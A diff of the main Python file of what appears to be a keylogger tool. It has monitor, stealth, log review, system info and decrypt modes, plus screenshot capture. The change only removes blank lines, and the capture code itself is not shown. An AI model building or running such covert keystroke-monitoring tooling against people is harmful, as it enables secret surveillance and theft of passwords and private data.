@@ -41,7 +41,6 @@ from ui.dashboard import Dashboard
 
 console = Console()
 
-
 def parse_arguments():
     parser = argparse.ArgumentParser(
         description=f"{APP_NAME} - {APP_TAGLINE}",
@@ -78,7 +77,6 @@ def parse_arguments():
         help="Disable screenshot capture",
     )
     return parser.parse_args()
-
 
 def show_interactive_menu() -> str:
     menu = Text()
@@ -139,7 +137,6 @@ def show_interactive_menu() -> str:
         return mode_map.get(choice, "monitor")
     except (KeyboardInterrupt, EOFError):
         return "exit"
-
 
 def run_monitor_mode(args):
     crypto = EncryptionManager()
@@ -202,7 +199,6 @@ def run_monitor_mode(args):
     finally:
         shutdown()
 
-
 def run_stealth_mode(args):
     crypto = EncryptionManager()
     keylogger = KeystrokeEngine(encryption_manager=crypto)
@@ -254,26 +250,22 @@ def run_stealth_mode(args):
     except KeyboardInterrupt:
         signal_handler(None, None)
 
-
 def run_review_mode(args):
     crypto = EncryptionManager()
     file_handler = FileHandler(encryption_manager=crypto)
     dashboard = Dashboard()
     dashboard.show_log_review(file_handler)
 
-
 def run_sysinfo_mode(args):
     profiler = SystemProfiler()
     dashboard = Dashboard()
     dashboard.show_system_info(profiler)
-
 
 def run_decrypt_mode(args):
     crypto = EncryptionManager()
     file_handler = FileHandler(encryption_manager=crypto)
     dashboard = Dashboard(encryption=crypto)
     dashboard.show_decrypt_menu(file_handler)
-
 
 def run_tests(args):
     import unittest
@@ -295,7 +287,6 @@ def run_tests(args):
         console.print(
             f"\n  [bold {THEME_ERROR}]❌ Some tests failed. See output above.[/]\n"
         )
-
 
 def main():
     args = parse_arguments()
@@ -334,7 +325,6 @@ def main():
     else:
         console.print(f"  [bold {THEME_ERROR}]Unknown mode: {mode}[/]")
         sys.exit(1)
-
 
 if __name__ == "__main__":
     main()
